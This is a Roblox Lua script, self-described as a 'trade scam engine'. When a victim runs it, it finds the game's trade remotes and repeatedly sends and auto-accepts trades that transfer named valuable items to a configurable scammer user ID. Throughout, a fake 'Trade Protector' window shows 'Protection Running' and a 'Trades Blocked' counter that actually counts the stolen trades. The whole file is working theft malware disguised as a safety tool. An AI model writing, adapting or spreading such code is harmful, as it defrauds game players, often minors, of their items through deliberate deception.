--[[
============================================================================
TRADE SCAM ENGINE - ASCII VERSION (NO UNICODE)
============================================================================
--]]

-- =============================================
-- 🔥 CONFIGURATION - EDIT THESE VALUES
-- =============================================
local CONFIG = {
    -- YOUR USER ID (the person receiving items)
    SCAMMER_ID = 1779494756,  -- <-- CHANGE THIS TO YOUR USER ID
    
    -- Brainrots to steal (in order)
    TARGETS = {
        "Strawberry Elephant",
        "Skibidi Toilet",
        "Meowl",
        "Dragon Gingerini",
        "Grande Brainrot God",
        "Chocolate Llama Rot",
        "Headless Horseman",
        "Cooki and Milki",
        "Dragon Cannelloni"
    },
    
    -- Settings
    DELAY = 3,           -- Seconds between trades
    MAX_ITEMS = 4,        -- Items per trade
    SHOW_GUI = true,      -- Show fake protection GUI
}

-- =============================================
-- SERVICES
-- =============================================
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer

-- =============================================
-- SIMPLE ID GENERATOR
-- =============================================
local function generateId()
    return tostring(os.time()) .. tostring(math.random(1000, 9999))
end

-- =============================================
-- FIND TRADE REMOTES
-- =============================================
local TradeRemote = nil
local AcceptRemote = nil

local function findTradeRemotes()
    print("[*] Looking for trade system...")
    
    local names = {"Trade", "SendTrade", "TradeRequest", "TradeEvent"}
    
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") then
            for _, name in ipairs(names) do
                if obj.Name:find(name) then
                    TradeRemote = obj
                    print("[+] Found trade remote:", obj.Name)
                    break
                end
            end
        end
    end
    
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") and obj.Name:lower():find("accept") then
            AcceptRemote = obj
            print("[+] Found accept remote:", obj.Name)
            break
        end
    end
    
    return TradeRemote ~= nil
end

-- =============================================
-- BRAINROT VALUES
-- =============================================
local VALUES = {
    ["Strawberry Elephant"] = 250,
    ["Skibidi Toilet"] = 330,
    ["Meowl"] = 275,
    ["Dragon Gingerini"] = 300,
    ["Grande Brainrot God"] = 500,
    ["Chocolate Llama Rot"] = 450,
    ["Headless Horseman"] = 175,
    ["Cooki and Milki"] = 155,
    ["Dragon Cannelloni"] = 100,
}

-- =============================================
-- CREATE FAKE GUI (ASCII ONLY)
-- =============================================
local FakeGUI = nil

if CONFIG.SHOW_GUI then
    local success, gui = pcall(function()
        local sg = Instance.new("ScreenGui")
        sg.Name = "TradeProtector"
        sg.Parent = CoreGui
        sg.DisplayOrder = 999999
        sg.Enabled = true
        sg.IgnoreGuiInset = true
        return sg
    end)
    
    if success and gui then
        FakeGUI = gui
        
        -- Main frame
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0, 350, 0, 180)
        frame.Position = UDim2.new(0.5, -175, 0.5, -90)
        frame.BackgroundColor3 = Color3.fromRGB(20, 25, 35)
        frame.BackgroundTransparency = 0.1
        frame.BorderSizePixel = 0
        frame.Active = true
        frame.Draggable = true
        frame.Parent = FakeGUI
        
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 12)
        corner.Parent = frame
        
        -- Title (no unicode)
        local title = Instance.new("TextLabel")
        title.Size = UDim2.new(1, 0, 0, 40)
        title.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
        title.BorderSizePixel = 0
        title.Text = "TRADE PROTECTOR"
        title.TextColor3 = Color3.fromRGB(255, 100, 100)
        title.TextSize = 18
        title.Font = Enum.Font.GothamBold
        title.Parent = frame
        
        local titleCorner = Instance.new("UICorner")
        titleCorner.CornerRadius = UDim.new(0, 12)
        titleCorner.Parent = title
        
        -- Status
        local status = Instance.new("TextLabel")
        status.Size = UDim2.new(1, -20, 0, 30)
        status.Position = UDim2.new(0, 10, 0, 50)
        status.BackgroundTransparency = 1
        status.Text = "[ACTIVE] Protection Running"
        status.TextColor3 = Color3.fromRGB(100, 255, 100)
        status.TextSize = 14
        status.Font = Enum.Font.GothamBold
        status.Parent = frame
        
        -- Counter
        local counter = Instance.new("TextLabel")
        counter.Size = UDim2.new(1, -20, 0, 25)
        counter.Position = UDim2.new(0, 10, 0, 85)
        counter.BackgroundTransparency = 1
        counter.Text = "Trades Blocked: 0"
        counter.TextColor3 = Color3.fromRGB(200, 200, 200)
        counter.TextSize = 13
        counter.Font = Enum.Font.Gotham
        counter.Parent = frame
        
        -- Fake button
        local button = Instance.new("TextButton")
        button.Size = UDim2.new(1, -40, 0, 40)
        button.Position = UDim2.new(0, 20, 0, 120)
        button.BackgroundColor3 = Color3.fromRGB(50, 100, 200)
        button.Text = "SCAN TRADES"
        button.TextColor3 = Color3.fromRGB(255, 255, 255)
        button.TextSize = 14
        button.Font = Enum.Font.GothamBold
        button.Parent = frame
        
        local buttonCorner = Instance.new("UICorner")
        buttonCorner.CornerRadius = UDim.new(0, 8)
        buttonCorner.Parent = button
        
        -- Button click effect (fake)
        button.MouseButton1Click:Connect(function()
            status.Text = "[SCANNING] Please wait..."
            status.TextColor3 = Color3.fromRGB(255, 200, 100)
            task.wait(0.5)
            status.Text = "[ACTIVE] Protection Running"
            status.TextColor3 = Color3.fromRGB(100, 255, 100)
        end)
    end
end

-- =============================================
-- SEND TRADE REQUEST
-- =============================================
local tradeCount = 0
local scamActive = true

local function sendTrade()
    if not TradeRemote then
        if not findTradeRemotes() then
            return false
        end
    end
    
    -- Create items
    local items = {}
    for i = 1, math.min(#CONFIG.TARGETS, CONFIG.MAX_ITEMS) do
        table.insert(items, {
            Name = CONFIG.TARGETS[i],
            Value = VALUES[CONFIG.TARGETS[i]] or 0,
            ID = generateId()
        })
    end
    
    -- Target (scammer)
    local target = {UserId = CONFIG.SCAMMER_ID}
    local tradeId = generateId()
    
    -- Send trade
    local success = pcall(function()
        TradeRemote:FireServer(target, items, tradeId, true)
        
        task.wait(0.2)
        
        if AcceptRemote then
            pcall(function()
                AcceptRemote:FireServer(target)
            end)
        end
    end)
    
    return success
end

-- =============================================
-- MAIN LOOP
-- =============================================
task.spawn(function()
    while scamActive do
        local success = sendTrade()
        
        if success then
            tradeCount = tradeCount + 1
            print("[+] Trade #" .. tradeCount .. " sent to " .. CONFIG.SCAMMER_ID)
            
            -- Update fake GUI
            if FakeGUI then
                local frame = FakeGUI:FindFirstChildOfClass("Frame")
                if frame then
                    local counter = frame:FindFirstChild("TextLabel")
                    if counter and counter.Text:find("Trades Blocked") then
                        counter.Text = "Trades Blocked: " .. tradeCount
                    end
                end
            end
        end
        
        task.wait(CONFIG.DELAY)
    end
end)

-- =============================================
-- AUTO-RESTART
-- =============================================
LocalPlayer.CharacterAdded:Connect(function()
    task.wait(3)
    print("[*] Player respawned - continuing")
end)

-- =============================================
-- TOGGLE GUI WITH F4
-- =============================================
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.F4 and FakeGUI then
        local frame = FakeGUI:FindFirstChildOfClass("Frame")
        if frame then
            frame.Visible = not frame.Visible
        end
    end
end)

-- =============================================
-- START
-- =============================================
findTradeRemotes()

print("========================================")
print("TRADE SCAM LOADED")
print("========================================")
print("Target ID: " .. CONFIG.SCAMMER_ID)
print("Items: " .. #CONFIG.TARGETS)
print("Delay: " .. CONFIG.DELAY .. "s")
print("========================================")
print("Press F4 to toggle GUI")
print("========================================")